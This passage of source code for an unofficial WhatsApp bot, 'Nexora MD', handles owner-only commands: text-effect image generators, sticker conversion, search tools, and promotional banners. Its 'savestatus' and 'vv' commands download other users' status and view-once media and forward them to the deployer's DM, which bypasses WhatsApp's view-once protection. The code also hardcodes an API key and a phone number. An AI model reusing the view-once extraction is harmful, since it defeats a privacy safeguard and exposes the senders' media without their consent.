        await empire.sendMessage(from, { image: { url }, caption: `🌠 Making Neon Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Making Neon." }, { quoted: m });
    }
}
break;

// ▫️ /royaltext - Royal text effect
case "royaltext": {
    if (!isCreator) return reply("sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.")
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .royaltext Nexora " }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/royaltext?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `👑 Royal Text Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Royal Text." }, { quoted: m });
    }
}
break;

// ▫️ /freecreate - 3D hologram text effect
case "freecreate": {
    if (!isCreator) return reply("sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.")
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .freecreate Nexora " }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/freecreate?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `🧊 3D Hologram Text Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Free Create Text." }, { quoted: m });
    }
}
break;

// ▫️ /galaxystyle - Galaxy style name logo
case "galaxystyle": {
     if (!isCreator) return reply("sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.")
     
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .galaxystyle Nexora " }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/galaxystyle?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `🪐 Galaxy Style Logo Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Galaxy Style Logo." }, { quoted: m });
    }
}
break;

// ▫️ /lighteffects - Green neon light effects
case "lighteffects": {
if (!isCreator) return reply("sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.")

    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .lighteffects Nexora " }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/lighteffects?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `💡 Light Effects Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Light Effects." }, { quoted: m });
    }
}
break
case 'autoheal': {
    if (!m.isGroup) return
   // if (!isAdmins) return
     if (!isCreator) return reply("sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.")

    if (!db.autoheal) db.autoheal = {}

    if (args[0] === 'on') {
        const meta = await empire.groupMetadata(m.chat)

        db.autoheal[m.chat] = {
            subject: meta.subject,
            desc: meta.desc || ""
        }

        saveDB()
        reply("♻️ ᴀᴜᴛᴏʜᴇᴀʟ ᴇɴᴀʙʟᴇᴅ 💧ᴀʟʟ ɢʀᴏᴜᴘ ᴘʀᴏғɪʟᴇ ᴄʜᴀɴɢᴇs ᴡɪʟʟ ʙᴇ ʀᴇsᴛᴏʀᴇᴅ ɪᴍᴍᴇᴅɪᴀᴛᴇʟʏ 💧")
    } else if (args[0] === 'off') {
        delete db.autoheal[m.chat]
        saveDB()
        reply("AutoHeal disabled.")
    } else {
        reply("Usage: .autoheal on/off")
    }
}
break;

case 'tosticker':
case 'sticker': {
  if (!isCreator) return;
  if (!quoted) return reply(`💧 Reply to an image or video\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  if (!/image|video/.test(mime)) return reply(`💧 Reply to an image or short video\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

  try {
    const media = await quoted.download()
    if (!media) return reply(`💧 Failed to download media\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

    let stickerBuffer

    if (/image/.test(mime)) {
      stickerBuffer = await imageToWebp(media)
    } else {
      stickerBuffer = await videoToWebp(media)
    }

    await empire.sendMessage(m.chat, {
      sticker: stickerBuffer
    }, { quoted: m })
  } catch (err) {
    console.log('tosticker error:', err)
    reply(`❌ Failed to create sticker\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }
}
break

case 'toimg': {
if (!isCreator) return;
  if (!quoted) return reply(`💧 Reply to a sticker\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  if (!/webp/.test(mime)) return reply(`💧 Reply to a sticker only\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

  try {
    const media = await quoted.download()
    if (!media) return reply(`💧 Failed to download sticker\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

    const filePath = getRandom('.png')
    fs.writeFileSync(filePath, media)

    await empire.sendMessage(m.chat, {
      image: fs.readFileSync(filePath),
      caption: `┏━━━━━━━━━━━━━─╮
┃  ✅ Sticker converted
┃  💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †
╰──────────────╯`
    }, { quoted: m })

    fs.unlinkSync(filePath)
  } catch (err) {
    console.log('toimg error:', err)
    reply(`❌ Failed to convert sticker\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }
}
break


case 'qrcode': {
  if (!text) return reply(`Example: ${prefix}qrcode https://example.com\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

  try {
    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=512x512&data=${encodeURIComponent(text)}`

    await empire.sendMessage(m.chat, {
      image: { url: qrUrl },
      caption: `┏━━━━━━━━━━━━━─╮
┃  ✅ QR Code generated
┃  🔹 Data: ${text}
┃  💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †
╰──────────────╯`
    }, { quoted: m })
  } catch (err) {
    console.log('qrcode error:', err)
    reply(`❌ Failed to generate QR code\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }
}
break

case 'shorturl': {
  if (!text) return reply(`Example: ${prefix}shorturl https://example.com\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

  try {
    const api = `https://tinyurl.com/api-create.php?url=${encodeURIComponent(text)}`
    const res = await axios.get(api)

    if (!res.data) return reply(`💧 Failed to shorten link\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

    reply(`┏━━━━━━━━━━━━━─╮
┃  🔗 Shortened URL
┃  ${res.data}
┃  💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †
╰──────────────╯`)
  } catch (err) {
    console.log('shorturl error:', err)
    reply(`❌ Failed to shorten URL\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }
}
break

case 'ytsearch': {
  if (!text) return reply(`Example: ${prefix}ytsearch burna boy\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

  try {
    const search = await yts(text)
    const videos = search.videos.slice(0, 8)

    if (!videos.length) return reply(`💧 No results found\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

    let teks = `┏━━━━━━━━━━━━━─╮
┃  🔎 YouTube Search
┃  Query: ${text}
┃  💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †
╰──────────────╯\n\n`

    for (let i = 0; i < videos.length; i++) {
      const v = videos[i]
      teks += `*${i + 1}.* ${v.title}
⏱ ${v.timestamp}
👁 ${v.views}
🔗 ${v.url}

`
    }

    await empire.sendMessage(m.chat, {
      image: { url: videos[0].thumbnail },
      caption: teks.trim()
    }, { quoted: m })
  } catch (err) {
    console.log('ytsearch error:', err)
    reply(`❌ Failed to search YouTube\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }
}
break
case "listgc":{
//if (isban) return reply(' BUY PREMIUM BRO, YOU FUCKED UP 😔');
let getGroups = await empire.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST OF GROUP BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await empire.groupMetadata(x)
teks += `❏ Group ${hituet+=1}\n┃ ⭔ *Name :* ${metadata.subject}\n┃ ⭔ *ID :* ${metadata.id}\n┃ ⭔ *MEMBER :* ${metadata.participants.length}\n╰⛥̷⛧̶⛥̷⛧̶|\n\n`
}
m.reply(teks)
}
break;
case "movie": {
     if (!isCreator) return reply("This command is restricted to sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ");

    if (!text) return m.reply("📌 Example: movie Inception");

    await empire.sendPresenceUpdate("composing", m.chat);

    try {
        const res = await axios.get(`http://www.omdbapi.com/?t=${encodeURIComponent(text)}&apikey=6372bb60`);
        if (res.data.Response === "False") return m.reply("❌ Movie not found.");

        const data = res.data;

        let caption = `
╭━━━🎬 *Nexora Movie Search* 🎬━━━╮

🍿 *Title:* ${data.Title}  
📅 *Year:* ${data.Year}  
🔖 *Rated:* ${data.Rated}  
🗓 *Released:* ${data.Released}  
⏳ *Runtime:* ${data.Runtime}  
🎭 *Genre:* ${data.Genre}
🎬 *Director:* ${data.Director}  
👥 *Actors:* ${data.Actors}  

📝 *Plot:*  
${data.Plot}

⭐ *IMDB Rating:* ${data.imdbRating}  
🔗 [IMDB Link](https://www.imdb.com/title/${data.imdbID})

*
        `;

        await empire.sendMessage(m.chat, {
            image: { url: data.Poster !== "N/A" ? data.Poster : "https://i.ibb.co/4f4tTnG/no-poster.png" },
            caption,
            mentions: [m.sender],
            contextInfo: {
                isForwarded: true,
                forwardingScore: 9999,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: `120363403195369259@newsletter`,
                    newsletterName: `💧𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳💧`
                }
            }
        }, { quoted: m });

    } catch (e) {
        console.error(e);
        m.reply("⚠️ Nexora MD v3  couldn’t fetch the movie info. Try again later!");
    }
}
break;
case 'owner': {
    if (!isCreator) return;

    // 📌 Configuration Details
    const ownerName = "Dev Xyron";  
    const ownerNumber = "2349118304002"; 
    const displayTag = "Nexora(Dev)💎";       

    // Fixed VCard format to enable Call, Message, and Save features natively
    let vcard = 'BEGIN:VCARD\n'
        + 'VERSION:3.0\n'
        + `FN:${ownerName}\n`
        + `N:;${ownerName};;;\n` 
        + `ORG:EMPIRE TECH;\n`   
        + `TEL;type=CELL;type=VOICE;waid=${ownerNumber}:+${ownerNumber}\n`
        + 'END:VCARD';

    await empire.sendMessage(m.chat, { react: { text: '👑', key: m.key } });

    try {
        // 1. Generate the absolute gorgeous dark glass identity pass buffer natively
        const ownerPassportBuffer = await drawOwnerPassportCard(ownerName, ownerNumber, displayTag);

        // 2. Dispatch the graphical identity asset without messy caption layouts
        await empire.sendMessage(m.chat, { 
            image: ownerPassportBuffer
        }, { quoted: m });

        // 3. Immediately dispatch the interactive functional standard VCard component underneath
        await empire.sendMessage(m.chat, { 
            contacts: { 
                displayName: displayTag, 
                contacts: [{ vcard }] 
            } 
        }, { quoted: m });

    } catch (e) {
        console.error("Owner Canvas Terminal Render Failure: ", e);
        reply("❌ Error compiling custom UI inside owner passport image layers.");
    }
}
break;


case "glitchtext2": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .glitchtext Nexora" }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/glitchtext?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `⚡ Glitch Text Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Glitch Text." }, { quoted: m });
    }
}
break;

// ▫️ /writetext - Write on wet glass
case "writetext": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .writetext Nexora" }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/writetext?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `✍️ Write Text Logo Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Write Text logo." }, { quoted: m });
    }
}
break;


// ▫️ /advancedglow - Advanced glow effects
case "advancedglow": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .advancedglow Nexora" }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/advancedglow?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `💡 Advanced Glow Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Advanced Glow." }, { quoted: m });
    }
}
break;

// ▫️ /typographytext - Typography on pavement
case "typographytext": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .typographytext Nexora" }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/typographytext?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `🖋️ Typography Text Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Typography Text." }, { quoted: m });
    }
}
break;

// ▫️ /pixelglitch - Pixel glitch effects
case "pixelglitch": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .pixelglitch Nexora" }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/pixelglitch?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `🧩 Pixel Glitch Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Pixel Glitch." }, { quoted: m });
    }
}
break;

// ▫️ /neonglitch - Neon glitch effects
case "neonglitch": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .neonglitch Nexora" }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/neonglitch?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `💥 Neon Glitch Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Neon Glitch." }, { quoted: m });
    }
}
break;

// ▫️ /flagtext - Nigeria flag text
case "flagtext": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .flagtext Nexora" }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/flagtext?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `🇳🇬 Nigeria Flag Text Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Flag Text." }, { quoted: m });
    }
}
break;

// ▫️ /flag3dtext - 3D American flag text
case "flag3dtext": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .flag3dtext Nexora" }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/flag3dtext?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `🇺🇸 3D Flag Text Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating 3D Flag Text." }, { quoted: m });
    }
}
break;

// ▫️ /deletingtext - Eraser deleting effect
case "deletingtext": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .deletingtext Nexora" }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/deletingtext?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `🩶 Deleting Text Effect Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Deleting Text." }, { quoted: m });
    }
}
break;

// ▫️ /blackpinkstyle - Blackpink style logo
case "blackpinkstyle": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .blackpinkstyle Nexora" }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/blackpinkstyle?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `🎀 Blackpink Style Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Blackpink Style." }, { quoted: m });
    }
}
break


// ▫️ /glowingtext - Glowing text effects
case "glowingtext": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .glowingtext Nexora" }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/glowingtext?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `💫 Glowing Text Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Glowing Text." }, { quoted: m });
    }
}
break;

// ▫️ /underwatertext - 3D underwater text
case "underwatertext": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .underwatertext Nexora" }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/underwatertext?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `🌊 Underwater Text Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Underwater Text." }, { quoted: m });
    }
}
break;


// ▫️ /logomaker - Bear logo maker
case "logomaker": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .logomaker Nexora" }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/logomaker?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `🐻 Logo Maker Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Logo Maker." }, { quoted: m });
    }
}
break;

// ▫️ /cartoonstyle - Cartoon graffiti text
case "cartoonstyle": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .cartoonstyle Nexora" }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/cartoonstyle?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `🎨 Cartoon Style Text Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Cartoon Style Text." }, { quoted: m });
    }
}
break;

// ▫️ /papercutstyle - 3D paper cut style
case "papercutstyle": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .papercutstyle Nexora" }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/papercutstyle?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `✂️ Paper Cut Style Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Paper Cut Style." }, { quoted: m });
    }
}
break;

// ▫️ /watercolortext - Watercolor text effect
case "watercolortext": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .watercolortext Nexora" }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/watercolortext?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `🖌️ Watercolor Text Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Watercolor Text." }, { quoted: m });
    }
}
break;

// ▫️ /effectclouds - Text on clouds in sky
case "effectclouds": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .effectclouds Nexora" }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/effectclouds?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `☁️ Clouds Text Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Cloud Text." }, { quoted: m });
    }
}
break;

// ▫️ /blackpinklogo - Blackpink logo creator
case "blackpinklogo": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .blackpinklogo Nexora" }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/blackpinklogo?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `💖 Blackpink Logo Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Blackpink Logo." }, { quoted: m });
    }
}
break;

// ▫️ /gradienttext - 3D gradient text effect
case "gradienttext": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .gradienttext Nexora" }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/gradienttext?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `🌈 Gradient Text Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Gradient Text." }, { quoted: m });
    }
}
break;

// ▫️ /summerbeach - Write in sand summer beach
case "summerbeach": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .summerbeach Nexora" }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/summerbeach?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `🏖️ Summer Beach Text Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Summer Beach Text." }, { quoted: m });
    }
}
break;

// ▫️ /luxurygold - Luxury gold text effect
case "luxurygold": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .luxurygold Nexora" }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/luxurygold?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `🥇 Luxury Gold Text Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Luxury Gold Text." }, { quoted: m });
    }
}
break;


case "repo": {
 
   // 📌 Fill your Telegram details here
   const tgUsername = "t.me/TheDev_Empire";   // <── your Telegram username
   const tgChannel  = "https://t.me/venomempire_404";    // <── your Telegram channel
   const waChannel  = "https://whatsapp.com/channel/0029Vb7KWN2E50UluAmGgM12";

   let caption = `
💠━━━━〔 𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2 𝗥𝗘𝗣𝗢 〕━━━━💠
┃
┃ 🤖 ᴀʙᴏᴜᴛ ɴᴇxᴏʀᴀ
┃ ╰ ɴᴇxᴏʀᴀ ᴍᴅ ɪꜱ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ
┃   ʙᴜɪʟᴛ ꜰᴏʀ ʜɪɢʜ-ʟᴇᴠᴇʟ ɢʀᴏᴜᴘ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ.
┃
┃ 🛠️ ꜰᴇᴀᴛᴜʀᴇꜱ
┃ ┌ ᴀɴᴛɪʀᴀɪᴅ : ɪɴꜱᴛᴀɴᴛ ꜱᴘᴀᴍ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ
┃ ├ ꜱᴇᴄᴜʀɪᴛʏ : ᴀᴅᴠᴀɴᴄᴇᴅ ɢʀᴏᴜᴘ ꜱʜɪᴇʟᴅꜱ
┃ └ ᴜᴛɪʟɪᴛɪᴇꜱ : ᴍᴜʟᴛɪ-ᴘᴜʀᴘᴏꜱᴇ ᴄᴏᴍᴍᴀɴᴅꜱ
┃
┃ 🚀 𝗔𝗰𝘁𝗶𝘃𝗲 𝗕𝗼𝘁 𝗟𝗶𝗻𝗸𝘀
┃ ◈ ꜱᴇʀᴠᴇʀ 1 : https://t.me/nexoramdbot
┃ ◈ ꜱᴇʀᴠᴇʀ 2 : https://t.me/nexoramd_bot
┃ ◈ ꜱᴇʀᴠᴇʀ 3 : https://t.me/nexora_mdbot
┃
┃ 🛡️ 𝗢𝘄𝗻𝗲𝗿 / 𝗗𝗲𝘃
┃ ╰ t.me/thedev_empire
┃
┃ 📡 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗨𝗽𝗱𝗮𝘁𝗲𝘀
┃ ◈ ᴛᴇʟᴇɢʀᴀᴍ : t.me/venomempire_404
┃ ◈ 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 : https://whatsapp.com/channel/0029Vb7KWN2E50UluAmGgM12
┃
💠━━━━━━━━━━━━━━━━━━━━━━━💠

`;

   await empire.sendMessage(m.chat, {
      text: caption,
      mentions: [m.sender],
      contextInfo: {
         isForwarded: true,
         forwardingScore: 9999,
         forwardedNewsletterMessageInfo: {
            newsletterJid: `120363403195369259@newsletter`, // your channel/newsletter ID
            newsletterName: `NEXORA MD v3 ❍`
         }
      }
   }, { quoted: m });
}
break;
case 'save':
case 'savestatus': {
    if (!isCreator) return;
    if (!m.quoted) return reply("Reply to the status or media you want to archive.")

    try {
        const q = m.quoted
        const mime = (q.msg || q).mimetype || ''
        
        
        const targetJid = empire.decodeJid(empire.user.id) 

      

        const media = await q.download()
        if (!media) return reply("❌ *DOWNLOAD FAILURE*")

        let options = {
            caption: `🕸️ *𝗡𝗘𝗫𝗢𝗥𝗔 𝗔𝗥𝗖𝗛𝗜𝗩𝗘 𝗦𝗬𝗦𝗧𝗘𝗠*\n\n✅ *Status Saved Successfully*`,
            contextInfo: {
                externalAdReply: {
                    title: "𝗡𝗲𝘅𝗼𝗿𝗮 𝗠𝗱 𝗔𝗿𝗰𝗵𝗶𝘃𝗲",
                    body: "Secure Media Storage",
                    thumbnail: await getBuffer('https://files.catbox.moe/wiiv8w.jpg'), // Optional: Your bot icon
                    sourceUrl: "https://whatsapp.com/channel/0029Vb7KWN2E50UluAmGgM12",
                    mediaType: 1,
                    showAdAttribution: true
                }
            }
        }

        // Send directly to the Bot/Deployer's DM
        if (/image/.test(mime)) {
            await empire.sendMessage(targetJid, { image: media, ...options })
        } else if (/video/.test(mime)) {
            await empire.sendMessage(targetJid, { video: media, ...options })
        } else if (/audio/.test(mime)) {
            await empire.sendMessage(targetJid, { 
                audio: media, 
                mimetype: 'audio/mpeg', 
                ptt: false 
            })
        } else if (q.text && !mime) {
            await empire.sendMessage(targetJid, { 
                text: `🕸️ *𝗡𝗘𝗫𝗢𝗥𝗔 𝗧𝗘𝗫𝗧 𝗔𝗥𝗖𝗛𝗜𝗩𝗘*\n\n${q.text}` 
            })
        }

        // Final feedback in the group chat
       // await m.react('✅')
        reply("📥 *status saved to your dm")

    } catch (err) {
        console.log(err)
        reply("☣️ *CRITICAL ERROR:* Archive transmission failed.")
    }
}
break


case 'vv':
case 'wow':
case 'hot':
case '👀':
case '🤧':
case '🔥':
case '🥹':
case '👁️': {
    if (!isCreator) return;
    if (!m.quoted) return reply('Reply to a view-once message!')

    try {
        // Target: Your private DM (The number that deployed the bot)
        const targetJid = empire.decodeJid(empire.user.id) 

        // Download the View-Once media
        const mediaBuffer = await empire.downloadMediaMessage(m.quoted)
        if (!mediaBuffer) return reply('❌ *DOWNLOAD FAILURE*')

        // React to the message in the group to show Nexora is working
        await empire.sendMessage(m.chat, { react: { text: '🔸', key: m.key } })

        const mediaType = m.quoted.mtype
        let options = {
            caption: `🕸️ *𝗡𝗘𝗫𝗢𝗥𝗔 𝗩𝗜𝗘𝗪-𝗢𝗡𝗖𝗘 𝗨𝗡𝗦𝗘𝗔𝗟𝗘𝗗*\n\n✅ *Media successfully extracted and archived.*`,
            contextInfo: {
                externalAdReply: {
